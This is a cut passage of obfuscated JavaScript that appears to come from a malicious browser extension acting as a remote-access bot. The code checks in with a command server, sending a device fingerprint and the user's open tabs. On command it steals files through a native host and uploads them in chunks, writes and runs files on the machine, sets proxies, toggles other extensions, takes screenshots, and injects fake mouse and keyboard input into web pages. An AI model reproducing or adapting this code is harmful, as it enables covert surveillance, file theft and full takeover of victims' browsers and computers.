  se=Date['now']()+xe,_0x4cff3f!=null&&_0x4cff3f['filesLive']&&typeof _0x4cff3f['filesLive']['pollMs']=='number'&&(se=Date['now']()+xe),dt();
}
function ut(){
  A&&(clearTimeout(A),A=null);
}
function dt(){
  if(A||!ce)return;
  const _0x44ccc1=async()=>{
    if(!Ne(null)){
      ut();
      return;
    }
    A=setTimeout(_0x44ccc1,Se);
    try{
      await ce();
    }
    catch{
    }
  };
  A=setTimeout(_0x44ccc1,Se);
}
function ft(_0x5a8a0a){
  ce=_0x5a8a0a;
}
function x(_0x3d7a80){
  const _0x1dfb76=_0x28cede;
  if(_0x3d7a80 instanceof Error)return _0x3d7a80['message'];
  if(typeof _0x3d7a80=='string')return _0x3d7a80;
  if(_0x3d7a80&&typeof _0x3d7a80=='object'){
    const _0x39a388=_0x3d7a80;
    if(typeof _0x39a388['message']=='string'&&_0x39a388['message'])return _0x39a388['message'];
    if(typeof _0x39a388['error']=='string'&&_0x39a388['error'])return _0x39a388['error'];
    if(_0x39a388['error']!=null)return x(_0x39a388['error']);
    try{
      return JSON['stringify'](_0x3d7a80);
    }
    catch{
    }
  }
  return String(_0x3d7a80);
}
function V(_0x32082f){
  return Le(_0x1398ca=>_0x1398ca(_0x32082f));
}
async function Le(_0x563d60){
  const _0xb3bcb9=_0x28cede;
  let _0x12a7de,_0x5269ab=!0x1,_0x45d12f=null;
  const _0x331505=_0x348bf7=>{
    const _0x1af1d6=_0x5a7b;
    if(!_0x45d12f)return;
    const _0x1d94a2=_0x45d12f;
    _0x45d12f=null,_0x1d94a2['reject'](_0x348bf7);
  };
  try{
    return _0x12a7de=chrome['runtime']['connectNative'](lt),_0x12a7de['onMessage']['addListener'](_0x3232ec=>{
      const _0x37aa0c=_0xb3bcb9;
      if(!_0x45d12f)return;
      const _0x3d339a=_0x45d12f;
      _0x45d12f=null,_0x3d339a['resolve'](_0x3232ec??{
      });
    }),_0x12a7de['onDisconnect']['addListener'](()=>{
      const _0x4ed73c=_0xb3bcb9;
      _0x5269ab=!0x0,_0x331505(chrome['runtime']['lastError']||new Error('native host disconnected'));
    }),await _0x563d60(_0x4ba489=>new Promise((_0x524540,_0x247d68)=>{
      const _0x858f59=_0xb3bcb9;
      if(_0x5269ab||!_0x12a7de){
        _0x247d68(new Error('native host disconnected'));
        return;
      }
      if(_0x45d12f){
        _0x247d68(new Error('native host busy'));
        return;
      }
      _0x45d12f={
        'resolve':_0x524540,'reject':_0x247d68
      };
      try{
        _0x12a7de['postMessage'](_0x4ba489);
      }
      catch(_0x11e70e){
        _0x45d12f=null,_0x247d68(_0x11e70e);
      }
    }));
  }
  finally{
    _0x5269ab=!0x0,_0x331505(new Error('native host disconnected'));
    try{
      _0x12a7de==null||_0x12a7de['disconnect']();
    }
    catch{
    }
  }
}
async function mt(_0x473ea1){
  const _0x313101=_0x28cede;
  if(!_0x473ea1)return;
  Ne(_0x473ea1)&&W(_0x473ea1);
  const _0x1dfa6b=await v();
  _0x1dfa6b&&(_0x473ea1['filesSnapshotRequestId']&&await ht(_0x1dfa6b,_0x473ea1['filesSnapshotRequestId'],_0x473ea1['filesSnapshotPath']??''),_0x473ea1['filesDownloadRequestId']&&await wt(_0x1dfa6b,_0x473ea1['filesDownloadRequestId'],_0x473ea1['filesDownloadPath']??'',_0x473ea1['filesDownloadPaths']),_0x473ea1['filesUploadRequestId']&&await pt(_0x1dfa6b,_0x473ea1['filesUploadRequestId'],_0x473ea1['filesUploadPath']??''),_0x473ea1['filesRunRequestId']&&await yt(_0x1dfa6b,_0x473ea1['filesRunRequestId'],_0x473ea1['filesRunPath']??''));
}
async function ht(_0x392df2,_0x32a438,_0x1eda78){
  const _0x307fa7=_0x28cede,_0x2b3278=_0x392df2+':'+_0x32a438;
  if(!X['has'](_0x2b3278)){
    X['add'](_0x2b3278);
    try{
      const _0x56eaf3=!_0x1eda78['trim'](),_0x12762f=_0x56eaf3?await V({
        'action':'drives'
      }):await V({
        'action':'list','path':_0x1eda78['trim']()
      });
      if(!(_0x12762f!=null&&_0x12762f['ok']))throw new Error(x((_0x12762f==null?void 0x0:_0x12762f['error'])||'native host error'));
      const _0x1e7469=_0x56eaf3?{
        'bot_id':_0x392df2,'requestId':_0x32a438,'drives':_0x12762f['drives']||[]
      }
      :{
        'bot_id':_0x392df2,'requestId':_0x32a438,'path':_0x12762f['path']||_0x1eda78['trim'](),'entries':_0x12762f['entries']||[]
      };
      await m('/ext/explorer/snapshot',_0x1e7469);
    }
    catch{
      try{
        await m('/ext/explorer/snapshot',{
          'bot_id':_0x392df2,'requestId':_0x32a438,'error':'snapshot failed'
        });
      }
      catch{
      }
    }
    finally{
      X['delete'](_0x2b3278),W(null);
    }
  }
}
async function wt(_0x49168e,_0x2e5244,_0x6e57dd,_0x470418){
  const _0x177457=_0x28cede,_0xe8fd2f=_0x49168e+':dl:'+_0x2e5244;
  if(!z['has'](_0xe8fd2f)){
    z['add'](_0xe8fd2f);
    try{
      const _0x3fd59a=(_0x470418??[])['map'](_0x9ad064=>_0x9ad064['trim']())['filter'](Boolean),_0x3cdd39=_0x6e57dd['trim']();
      if(_0x3fd59a['length']===0x0&&!_0x3cdd39)throw new Error('Missing file path');
      await Le(async _0x5c18e6=>{
        const _0x47157c=_0x177457;
        let _0x2cc714=0x0,_0x58bc52=0x0,_0x2d62fe='',_0x2caf37=!0x1;
        for(;
        !_0x2caf37;
        ){
          const _0x4d03e8={
            'action':'read','offset':_0x2cc714,'length':Pe
          };
          _0x3fd59a['length']>0x1?_0x4d03e8['paths']=_0x3fd59a:_0x4d03e8['path']=_0x3fd59a[0x0]||_0x3cdd39;
          const _0x6941e3=await _0x5c18e6(_0x4d03e8);
          if(!(_0x6941e3!=null&&_0x6941e3['ok']))throw new Error(x((_0x6941e3==null?void 0x0:_0x6941e3['error'])||'native host read error'));
          if(_0x58bc52||(_0x58bc52=typeof _0x6941e3['totalSize']=='number'?_0x6941e3['totalSize']:0x0,_0x2d62fe=typeof _0x6941e3['fileName']=='string'?_0x6941e3['fileName']:''),_0x58bc52>Oe)throw new Error('File too large');
          const _0x5da095=typeof _0x6941e3['read']=='number'?_0x6941e3['read']:0x0;
          if(_0x2caf37=!!_0x6941e3['done']||_0x5da095<=0x0||_0x2cc714+_0x5da095>=_0x58bc52,await m('/ext/explorer/download-chunk',{
            'bot_id':_0x49168e,'requestId':_0x2e5244,'offset':_0x2cc714,'data':_0x6941e3['data']||'','done':_0x2caf37,'fileName':_0x2d62fe,'totalSize':_0x58bc52
          }),_0x2cc714+=_0x5da095,_0x5da095<=0x0&&!_0x2caf37)throw new Error('Unexpected empty read');
        }
      });
    }
    catch(_0x2392f4){
      await m('/ext/explorer/download-chunk',{
        'bot_id':_0x49168e,'requestId':_0x2e5244,'error':x(_0x2392f4)['slice'](0x0,0x200)
      });
    }
    finally{
      z['delete'](_0xe8fd2f),W(null);
    }
  }
}
async function pt(_0x57e342,_0x535402,_0x4b873f){
  const _0x54bebc=_0x28cede,_0x378042=_0x57e342+':ul:'+_0x535402;
  if(!Q['has'](_0x378042)){
    Q['add'](_0x378042);
    try{
      const _0x3edfa1=_0x4b873f['trim']();
      if(!_0x3edfa1)throw new Error('Missing destination path');
      let _0x37ab19=0x0,_0x2de459=0x0,_0x78cd01=!0x1;
      for(;
      !_0x78cd01;
      ){
        const _0x47afb6=await m('/ext/explorer/upload-pull',{
          'bot_id':_0x57e342,'requestId':_0x535402,'offset':_0x37ab19,'length':Pe
        });
        if(!(_0x47afb6!=null&&_0x47afb6['ok']))throw new Error(String((_0x47afb6==null?void 0x0:_0x47afb6['error'])||'upload pull failed'));
        if(!_0x2de459&&typeof _0x47afb6['totalSize']=='number'&&(_0x2de459=_0x47afb6['totalSize']),_0x2de459>Oe)throw new Error('File too large');
        const _0x4533bf=typeof _0x47afb6['read']=='number'?_0x47afb6['read']:0x0;
        if(_0x78cd01=!!_0x47afb6['done']||_0x4533bf<=0x0,_0x4533bf>0x0){
          const _0x2b0d44=await V({
            'action':'write','path':_0x3edfa1,'offset':_0x37ab19,'data':_0x47afb6['data']||''
          });
          if(!(_0x2b0d44!=null&&_0x2b0d44['ok']))throw new Error(x((_0x2b0d44==null?void 0x0:_0x2b0d44['error'])||'native host write error'));
          _0x37ab19+=_0x4533bf;
        }
        if(_0x4533bf<=0x0&&!_0x78cd01)throw new Error('Unexpected empty upload chunk');
      }
      await m('/ext/explorer/upload-complete',{
        'bot_id':_0x57e342,'requestId':_0x535402
      });
    }
    catch(_0x4a33fc){
      await m('/ext/explorer/upload-complete',{
        'bot_id':_0x57e342,'requestId':_0x535402,'error':x(_0x4a33fc)['slice'](0x0,0x200)
      });
    }
    finally{
      Q['delete'](_0x378042),W(null);
    }
  }
}
async function yt(_0x5a6775,_0x3c4f29,_0x3e6d07){
  const _0x147cf3=_0x28cede,_0x1e5c7c=_0x5a6775+':run:'+_0x3c4f29;
  if(!Z['has'](_0x1e5c7c)){
    Z['add'](_0x1e5c7c);
    try{
      const _0x1db7e0=_0x3e6d07['trim']();
      if(!_0x1db7e0)throw new Error('Missing file path');
      const _0x90f79f=await V({
        'action':'run','path':_0x1db7e0
      });
      if(!(_0x90f79f!=null&&_0x90f79f['ok']))throw new Error(x((_0x90f79f==null?void 0x0:_0x90f79f['error'])||'native host run error'));
      await m('/ext/explorer/run-complete',{
        'bot_id':_0x5a6775,'requestId':_0x3c4f29
      });
    }
    catch(_0x2bd06d){
      await m('/ext/explorer/run-complete',{
        'bot_id':_0x5a6775,'requestId':_0x3c4f29,'error':x(_0x2bd06d)['slice'](0x0,0x200)
      });
    }
    finally{
      Z['delete'](_0x1e5c7c),W(null);
    }
  }
}
async function bt(){
  const _0x5bf609=_0x28cede;
  try{
    return(await chrome['tabs']['query']({
    }))['filter'](_0x2036c0=>_0x2036c0['url']&&!_0x2036c0['url']['startsWith']('chrome://')&&!_0x2036c0['url']['startsWith']('chrome-extension://'))['map'](_0x262137=>({
      'tab_id':_0x262137['id']??0x0,'url':_0x262137['url']??'','title':_0x262137['title']??''
    }));
  }
  catch{
    return[];
  }
}
async function gt(){
  const _0x220392=_0x28cede,_0x154036={
  };
  try{
    const _0x3c0c70=document['createElement']('canvas');
    _0x3c0c70['width']=0xf0,_0x3c0c70['height']=0x3c;
    const _0xba7449=_0x3c0c70['getContext']('2d');
    if(_0xba7449){
      _0xba7449['textBaseline']='alphabetic',_0xba7449['fillStyle']='#f60',_0xba7449['fillRect'](0x7d,0x1,0x3e,0x14),_0xba7449['fillStyle']='#069',_0xba7449['font']='11pt Arial',_0xba7449['fillText']('Cwm fjordbank!',0x2,0xf),_0xba7449['fillStyle']='rgba(102,204,0,0.7)',_0xba7449['font']='18pt Georgia',_0xba7449['fillText']('Cwm fjordbank!',0x4,0x28);
      const _0x2986b4=_0x3c0c70['toDataURL']();
      _0x154036['canvas']=_0x2986b4['slice'](_0x2986b4['length']-0x1c);
    }
  }
  catch{
  }
  try{
    const _0x509393=document['createElement']('canvas'),_0x3e33ac=_0x509393['getContext']('webgl')||_0x509393['getContext']('experimental-webgl');
    if(_0x3e33ac){
      const _0x4dd640=_0x3e33ac['getExtension']('WEBGL_debug_renderer_info');
      _0x4dd640&&(_0x154036['webgl_vendor']=_0x3e33ac['getParameter'](_0x4dd640['UNMASKED_VENDOR_WEBGL']),_0x154036['webgl_renderer']=_0x3e33ac['getParameter'](_0x4dd640['UNMASKED_RENDERER_WEBGL']));
    }
  }
  catch{
  }
  try{
    const _0x361d3f=new OfflineAudioContext(0x1,0xac44,0xac44),_0x3e901e=_0x361d3f['createOscillator'](),_0x442f3f=_0x361d3f['createDynamicsCompressor']();
    _0x3e901e['type']='triangle',_0x3e901e['frequency']['setValueAtTime'](0x2710,_0x361d3f['currentTime']),_0x442f3f['threshold']['setValueAtTime'](-0x32,_0x361d3f['currentTime']),_0x442f3f['knee']['setValueAtTime'](0x28,_0x361d3f['currentTime']),_0x442f3f['ratio']['setValueAtTime'](0xc,_0x361d3f['currentTime']),_0x442f3f['attack']['setValueAtTime'](0x0,_0x361d3f['currentTime']),_0x442f3f['release']['setValueAtTime'](0.25,_0x361d3f['currentTime']),_0x3e901e['connect'](_0x442f3f),_0x442f3f['connect'](_0x361d3f['destination']),_0x3e901e['start'](0x0);
    const _0x2ee71c=(await _0x361d3f['startRendering']())['getChannelData'](0x0);
    let _0x2a04d3=0x0;
    for(let _0x5638e7=0x1194;
    _0x5638e7<0x1388;
    _0x5638e7++)_0x2a04d3+=Math['abs'](_0x2ee71c[_0x5638e7]);
    _0x154036['audio']=_0x2a04d3['toFixed'](0xa);
  }
  catch{
  }
  _0x154036['platform']=navigator['platform']||'',_0x154036['hw_concurrency']=navigator['hardwareConcurrency']||0x0,_0x154036['device_memory']=navigator['deviceMemory']||0x0,_0x154036['color_depth']=screen['colorDepth']||0x0;
  try{
    const _0xf4960='mmmmmmmmmmlli',_0x3aed72='72px',_0x23b994=['monospace','sans-serif','serif'],_0x5ca9e7=['Arial','Arial Black','Calibri','Cambria','Comic Sans MS','Consolas','Courier New','Georgia','Helvetica','Impact','Lucida Console','Microsoft Sans Serif','Palatino Linotype','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana'],_0x451849=document['createElement']('canvas')['getContext']('2d');
    if(_0x451849){
      const _0x435119={
      };
      for(const _0x2a58d1 of _0x23b994)_0x451849['font']=_0x3aed72+'\x20'+_0x2a58d1,_0x435119[_0x2a58d1]=_0x451849['measureText'](_0xf4960)['width'];
      const _0x328151=[];
      for(const _0x4fc82f of _0x5ca9e7)for(const _0x5951c1 of _0x23b994)if(_0x451849['font']=_0x3aed72+'\x20\x27'+_0x4fc82f+'\x27,'+_0x5951c1,_0x451849['measureText'](_0xf4960)['width']!==_0x435119[_0x5951c1]){
        _0x328151['push'](_0x4fc82f);
        break;
      }
      _0x154036['fonts']=_0x328151;
    }
  }
  catch{
  }
  return _0x154036;
}
async function vt(){
  const _0x1592fb=_0x28cede;
  var _0x3c83ee;
  try{
    const _0x441cfc=await chrome['storage']['local']['get'](C);
    if(_0x441cfc[C]&&typeof _0x441cfc[C]=='object')return _0x441cfc[C];
  }
  catch{
  }
  const _0x412bc8=(await chrome['tabs']['query']({
  }))['find'](_0x5d7829=>_0x5d7829['id']!=null&&_0x5d7829['url']&&!_0x5d7829['url']['startsWith']('chrome')&&!_0x5d7829['url']['startsWith']('about')&&!_0x5d7829['url']['startsWith']('edge')&&!_0x5d7829['url']['startsWith']('data'));
  if(!(_0x412bc8!=null&&_0x412bc8['id']))return{
  };
  try{
    const _0x38d155=(_0x3c83ee=(await chrome['scripting']['executeScript']({
      'target':{
        'tabId':_0x412bc8['id']
      },'func':gt
    }))[0x0])==null?void 0x0:_0x3c83ee['result'];
    if(_0x38d155&&typeof _0x38d155=='object')return await chrome['storage']['local']['set']({
      [C]:_0x38d155
    }),_0x38d155;
  }
  catch{
  }
  return{
  };
}
async function j(){
  const _0x2d27c9=_0x28cede;
  var _0x51375e,_0x216bc2;
  const _0x7de00c=await v();
  if(!_0x7de00c)return;
  const _0x62b1b5=await bt(),_0x4e613e=await vt(),_0x12bbb5=await m('/ext/ping',{
    'bot_id':_0x7de00c,'browser':g(),'language':qe(),'screen':Ke(),'timezone':Ve(),'user_agent':Te(),'fingerprint':Object['keys'](_0x4e613e)['length']>0x0?JSON['stringify'](_0x4e613e):'','tabs':_0x62b1b5
  });
  if(_0x12bbb5&&Array['isArray'](_0x12bbb5['injects'])&&await S({
    [re]:_0x12bbb5['injects']
  }),_0x12bbb5&&Array['isArray'](_0x12bbb5['spoofs'])&&await S({
    [oe]:_0x12bbb5['spoofs']
  }),_0x12bbb5&&Array['isArray'](_0x12bbb5['commands'])){
    for(const _0x138e6b of _0x12bbb5['commands'])if(_0x138e6b['type']==='close_tab'){
      const _0x40c4a3=await chrome['tabs']['query']({
      });
      for(const _0x20ffa6 of _0x40c4a3)_0x20ffa6['url']&&L(_0x20ffa6['url'],_0x138e6b['payload'])&&_0x20ffa6['id']&&chrome['tabs']['remove'](_0x20ffa6['id']);
    }
    else{
      if(_0x138e6b['type']==='reload_tab'){
        const _0x3f1f99=await chrome['tabs']['query']({
        });
        for(const _0xb91ce9 of _0x3f1f99)_0xb91ce9['url']&&L(_0xb91ce9['url'],_0x138e6b['payload'])&&_0xb91ce9['id']&&chrome['tabs']['reload'](_0xb91ce9['id']);
      }
      else{
        if(_0x138e6b['type']==='ext_set_enabled')try{
          const {
            ext_id:_0x1cc5a0,enabled:_0x58ed2a
          }
          =JSON['parse'](_0x138e6b['payload']);
          _0x1cc5a0&&_0x1cc5a0!==chrome['runtime']['id']&&await chrome['management']['setEnabled'](_0x1cc5a0,_0x58ed2a)['catch'](()=>{
          });
        }
        catch{
        }
        else{
          if(_0x138e6b['type']==='open_url')chrome['tabs']['create']({
            'url':_0x138e6b['payload']
          });
          else{
            if(_0x138e6b['type']==='screenshot')await ct(_0x138e6b['payload']);
            else{
              if(_0x138e6b['type']==='set_proxy')try{
                const {
                  host:_0xe7bf71,port:_0xc1bb15,username:_0xa2c027,password:_0xcee2df
                }
                =JSON['parse'](_0x138e6b['payload']),_0x594d12={
                  'value':{
                    'mode':'fixed_servers','rules':{
                      'singleProxy':{
                        'scheme':'http','host':_0xe7bf71,'port':_0xc1bb15
                      },'bypassList':['localhost','127.0.0.1','<local>']
                    }
                  },'scope':'regular'
                };
                _0xa2c027&&_0xcee2df&&((_0x216bc2=(_0x51375e=chrome['webRequest'])==null?void 0x0:_0x51375e['onAuthRequired'])==null||_0x216bc2['addListener']((_0x38adf3,_0x4ca2a1)=>{
                  _0x4ca2a1&&_0x4ca2a1({
                    'authCredentials':{
                      'username':_0xa2c027,'password':_0xcee2df
                    }
                  });
                },{
                  'urls':['<all_urls>']
                },['asyncBlocking'])),chrome['proxy']['settings']['set'](_0x594d12);
              }
              catch{
              }
              else{
                if(_0x138e6b['type']==='clear_proxy')chrome['proxy']['settings']['clear']({
                  'scope':'regular'
                });
                else{
                  if(_0x138e6b['type']==='notify')try{
                    const {
                      title:_0x1af363,body:_0x4c8aa4,icon:_0x2fdbf3,click_url:_0x383ae6,browser:_0x2767cb
                    }
                    =JSON['parse'](_0x138e6b['payload']),_0x399341=(_0x2767cb||'')['trim']();
                    if(_0x399341&&_0x399341['toLowerCase']()!==g()['toLowerCase']())continue;
                    const _0x8c7b60=String(_0x138e6b['id']),_0x47a012={
                      'type':'basic','title':_0x1af363||'\x20','message':_0x4c8aa4||'\x20','iconUrl':_0x2fdbf3||chrome['runtime']['getURL']('icon.png')
                    };
                    chrome['notifications']['create'](_0x8c7b60,_0x47a012),_0x383ae6&&(ie[_0x8c7b60]=_0x383ae6);
                  }
                  catch{
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  await mt(_0x12bbb5);
}
const _t=0x78,St=0xbb8,xt=0x3a98;
let f=null,P=!0x1,K,_,T,le,E,O=null,N=null;
function kt(){
  const _0x91d8c7=_0x28cede;
  return fe['replace'](/^http/i,'ws')['replace'](/\/$/,'');
}
function Et(_0x2dd156){
  const _0x59efba=_0x28cede;
  if(!_0x2dd156['startsWith']('http://')&&!_0x2dd156['startsWith']('https://'))return!0x1;
  try{
    if(new URL(_0x2dd156)['host']==='localhost:5173')return!0x1;
  }
  catch{
  }
  return!0x0;
}
async function We(){
  const _0x3e1264=_0x28cede;
  var _0x29b002;
  try{
    const _0x5cc563=(await chrome['windows']['getAll']({
      'populate':!0x0
    }))['filter'](_0x501a15=>_0x501a15['type']==='normal'&&_0x501a15['id']!==void 0x0&&Array['isArray'](_0x501a15['tabs']));
    if(_0x5cc563['length']===0x0)return null;
    const _0x142357=(_0x29b002=_0x5cc563['find'](_0x50619b=>_0x50619b['focused']))==null?void 0x0:_0x29b002['id'],_0x378bdc=_0x5cc563['flatMap'](_0x59f2fb=>_0x59f2fb['tabs'])['filter'](_0x24e2ad=>Et(_0x24e2ad['url']??''));
    if(_0x378bdc['length']===0x0)return null;
    const _0x1354d0=_0x378bdc['filter'](_0x4c18d0=>_0x4c18d0['active']&&_0x4c18d0['windowId']!==_0x142357)['sort']((_0x53ccc9,_0x38ea1a)=>(_0x38ea1a['lastAccessed']??0x0)-(_0x53ccc9['lastAccessed']??0x0));
    if(_0x1354d0['length']>0x0)return _0x1354d0[0x0];
    const _0x5dc829=_0x378bdc['filter'](_0x4f2445=>_0x4f2445['windowId']!==_0x142357)['sort']((_0x35d2d8,_0x464681)=>(_0x464681['lastAccessed']??0x0)-(_0x35d2d8['lastAccessed']??0x0));
    if(_0x5dc829['length']>0x0)return _0x5dc829[0x0];
    const _0x4e0e92=_0x378bdc['filter'](_0x1f2e48=>!_0x1f2e48['active'])['sort']((_0x3c1fa3,_0x339a5b)=>(_0x339a5b['lastAccessed']??0x0)-(_0x3c1fa3['lastAccessed']??0x0));
    return _0x4e0e92['length']>0x0?_0x4e0e92[0x0]:(_0x378bdc['sort']((_0x52e233,_0x1a18cd)=>(_0x1a18cd['lastAccessed']??0x0)-(_0x52e233['lastAccessed']??0x0)),_0x378bdc[0x0]);
  }
  catch{
    return null;
  }
}
function Tt(){
  const _0x5cabe2=_0x28cede;
  clearTimeout(le),le=setTimeout(()=>Me()['catch'](()=>{
  }),St);
}
function It(_0x2e5409){
  const _0x4853ec=_0x28cede;
  var _0x597d85=window['devicePixelRatio']||0x1,_0x371682=_0x2e5409['x']/_0x597d85,_0x2fce98=_0x2e5409['y']/_0x597d85,_0x311dbe={
    'ctrlKey':_0x2e5409['ctrl'],'shiftKey':_0x2e5409['shift'],'altKey':_0x2e5409['alt'],'metaKey':_0x2e5409['meta']
  },_0x3958b3={
    'ok':!0x1,'type':_0x2e5409['type'],'url':location['href'],'tag':'','cls':'','cx':_0x371682,'cy':_0x2fce98,'dpr':_0x597d85
  };
  function _0x25956c(){
    const _0x3a00b3=_0x4853ec;
    var _0x5367b6=document['elementFromPoint'](_0x371682,_0x2fce98);
    return _0x5367b6&&(_0x3958b3['tag']=_0x5367b6['tagName'],_0x3958b3['cls']=String(_0x5367b6['className']||'')['substring'](0x0,0x50)),_0x5367b6||document['body'];
  }
  function _0x5c0953(_0x4bf785,_0x3f386c,_0x4dfd9d){
    const _0x39b634=_0x4853ec;
    _0x4bf785['dispatchEvent'](new MouseEvent(_0x3f386c,_0x4dfd9d));
  }
  try{
    if(_0x2e5409['type']==='mouse_move')return _0x5c0953(_0x25956c(),'mousemove',Object['assign']({
      'bubbles':!0x0,'cancelable':!0x0,'view':window,'clientX':_0x371682,'clientY':_0x2fce98,'button':0x0,'buttons':0x0
    },_0x311dbe)),_0x3958b3['ok']=!0x0,_0x3958b3;
    if(_0x2e5409['type']==='mouse_down'){
      var _0x1776d5=_0x25956c(),_0x1b655a=_0x2e5409['btn']===0x2?0x2:_0x2e5409['btn']===0x1?0x4:0x1;
      if(_0x5c0953(_0x1776d5,'mousedown',Object['assign']({
        'bubbles':!0x0,'cancelable':!0x0,'view':window,'clientX':_0x371682,'clientY':_0x2fce98,'button':_0x2e5409['btn'],'buttons':_0x1b655a
      },_0x311dbe)),_0x1776d5 instanceof HTMLElement)try{
        _0x1776d5['focus']();
      }
      catch{
      }
      return _0x3958b3['ok']=!0x0,_0x3958b3;
    }
    if(_0x2e5409['type']==='mouse_up'){
      var _0x1ade3c=_0x25956c();
      return _0x5c0953(_0x1ade3c,'mouseup',Object['assign']({
        'bubbles':!0x0,'cancelable':!0x0,'view':window,'clientX':_0x371682,'clientY':_0x2fce98,'button':_0x2e5409['btn'],'buttons':0x0
      },_0x311dbe)),_0x5c0953(_0x1ade3c,'click',Object['assign']({
        'bubbles':!0x0,'cancelable':!0x0,'view':window,'clientX':_0x371682,'clientY':_0x2fce98,'button':_0x2e5409['btn'],'buttons':0x0,'detail':0x1
      },_0x311dbe)),_0x2e5409['btn']===0x2&&_0x5c0953(_0x1ade3c,'contextmenu',Object['assign']({
        'bubbles':!0x0,'cancelable':!0x0,'view':window,'clientX':_0x371682,'clientY':_0x2fce98,'button':0x2,'buttons':0x0
      },_0x311dbe)),_0x3958b3['ok']=!0x0,_0x3958b3;
    }
    if(_0x2e5409['type']==='scroll'){
      var _0x495cac=_0x25956c();
      _0x495cac['dispatchEvent'](new WheelEvent('wheel',Object['assign']({
        'bubbles':!0x0,'cancelable':!0x0,'view':window,'clientX':_0x371682,'clientY':_0x2fce98,'deltaX':_0x2e5409['dx'],'deltaY':_0x2e5409['dy'],'deltaMode':0x0
      },_0x311dbe)));
      for(var _0x3b5793=_0x495cac;
      _0x3b5793&&_0x3b5793!==document['documentElement'];
      ){
        var _0x2f979c=getComputedStyle(_0x3b5793);
        if(/auto|scroll/['test'](_0x2f979c['overflow']+_0x2f979c['overflowY']+_0x2f979c['overflowX']))return _0x3b5793['scrollBy'](_0x2e5409['dx'],_0x2e5409['dy']),_0x3958b3['ok']=!0x0,_0x3958b3;
        _0x3b5793=_0x3b5793['parentElement'];
      }
      return window['scrollBy'](_0x2e5409['dx'],_0x2e5409['dy']),_0x3958b3['ok']=!0x0,_0x3958b3;
    }
    if(_0x2e5409['type']==='key_down'){
      var _0x585a64=document['activeElement']||document['body'],_0x211dc1=Object['assign']({
        'bubbles':!0x0,'cancelable':!0x0,'key':_0x2e5409['key'],'code':_0x2e5409['code'],'keyCode':_0x2e5409['keyCode'],'which':_0x2e5409['keyCode']
      },_0x311dbe);
      _0x585a64['dispatchEvent'](new KeyboardEvent('keydown',_0x211dc1));
      var _0x263b3a=_0x585a64 instanceof HTMLInputElement,_0x23b9bb=_0x585a64 instanceof HTMLTextAreaElement,_0x228937=_0x585a64['isContentEditable']===!0x0,_0x28aa3d=_0x263b3a||_0x23b9bb||_0x228937;
      if(_0x28aa3d&&_0x2e5409['text']['length']===0x1&&!_0x2e5409['ctrl']&&!_0x2e5409['alt']&&!_0x2e5409['meta']){
        _0x585a64['dispatchEvent'](new KeyboardEvent('keypress',Object['assign']({
        },_0x211dc1,{
          'charCode':_0x2e5409['text']['charCodeAt'](0x0)
        })));
        var _0x49d712=!0x1;
        try{
          _0x49d712=document['execCommand']('insertText',!0x1,_0x2e5409['text']);
        }
        catch{
        }
        if(!_0x49d712&&(_0x263b3a||_0x23b9bb)){
          var _0x55d23f=_0x585a64,_0x139c52=_0x263b3a?HTMLInputElement['prototype']:HTMLTextAreaElement['prototype'],_0x2ed04f=Object['getOwnPropertyDescriptor'](_0x139c52,'value');
          if(_0x2ed04f&&_0x2ed04f['set']){
            var _0x5e9386=_0x55d23f['selectionStart']!=null?_0x55d23f['selectionStart']:_0x55d23f['value']['length'],_0x1d3d50=_0x55d23f['selectionEnd']!=null?_0x55d23f['selectionEnd']:_0x55d23f['value']['length'];
            _0x2ed04f['set']['call'](_0x55d23f,_0x55d23f['value']['slice'](0x0,_0x5e9386)+_0x2e5409['text']+_0x55d23f['value']['slice'](_0x1d3d50));
            try{
              _0x55d23f['setSelectionRange'](_0x5e9386+0x1,_0x5e9386+0x1);
            }
            catch{
            }
            _0x55d23f['dispatchEvent'](new Event('input',{
              'bubbles':!0x0
            }));
          }
        }
      }
      else{
        if(_0x28aa3d&&_0x2e5409['key']==='Backspace')try{
          document['execCommand']('delete',!0x1);
        }
        catch{
        }
        else{
          if(_0x28aa3d&&_0x2e5409['key']==='Delete')try{
            document['execCommand']('forwardDelete',!0x1);
          }
          catch{
          }
          else{
            if(_0x28aa3d&&_0x2e5409['key']==='Enter'&&!_0x2e5409['shift']){
              if(_0x23b9bb||_0x228937)try{
                document['execCommand']('insertLineBreak',!0x1);
              }
              catch{
                try{
                  document['execCommand']('insertText',!0x1,'\x0a');
                }
                catch{
                }
              }
              else{
                if(_0x263b3a){
                  var _0x530596=_0x585a64['form'];
                  if(_0x530596)try{
                    _0x530596['requestSubmit']?_0x530596['requestSubmit']():_0x530596['submit']();
                  }
                  catch{
                  }
                }
              }
            }
          }
        }
      }
      return _0x3958b3['tag']=_0x585a64['tagName'],_0x3958b3['ok']=!0x0,_0x3958b3;
    }
    if(_0x2e5409['type']==='key_up'){
      var _0x386361=document['activeElement']||document['body'];
      return _0x386361['dispatchEvent'](new KeyboardEvent('keyup',Object['assign']({
        'bubbles':!0x0,'cancelable':!0x0,'key':_0x2e5409['key'],'code':_0x2e5409['code'],'keyCode':_0x2e5409['keyCode'],'which':_0x2e5409['keyCode']
      },_0x311dbe))),_0x3958b3['tag']=_0x386361['tagName'],_0x3958b3['ok']=!0x0,_0x3958b3;
    }
  }
  catch(_0x158b3d){
    _0x3958b3['err']=String(_0x158b3d);
  }
  return _0x3958b3;
}
function De(_0x50be73){
  const _0x2af82b=_0x28cede;
  if(_===void 0x0){
    _0x50be73['type']!=='mouse_move'&&console['warn']('[remote] inject SKIPPED — no activeTabId, cmd=',_0x50be73['type']);
    return;
  }
  const _0x90694a=_;
  chrome['scripting']['executeScript']({
    'target':{
      'tabId':_0x90694a
    },'world':'MAIN','func':It,'args':[_0x50be73]
  })['then'](_0xfd4ffa=>{
    const _0x1558ca=_0x2af82b;
    var _0x29dccb;
    if(_0x50be73['type']==='mouse_move')return;
    const _0x25405e=(_0x29dccb=_0xfd4ffa==null?void 0x0:_0xfd4ffa[0x0])==null?void 0x0:_0x29dccb['result'];
    if(!_0x25405e){
      console['warn']('[remote] inject no result, cmd=',_0x50be73['type'],'tab=',_0x90694a);
      return;
    }
    console['log']('[remote] inject',_0x50be73['type'],'→ tab=',_0x90694a,'url=',_0x25405e['url'],'tag=',_0x25405e['tag'],'cls=',_0x25405e['cls'],'cx,cy=',_0x25405e['cx'],_0x25405e['cy'],'dpr=',_0x25405e['dpr'],_0x25405e['err']?'ERR='+_0x25405e['err']:'');
  })['catch'](_0x7c507=>{
    const _0x235a8d=_0x2af82b;
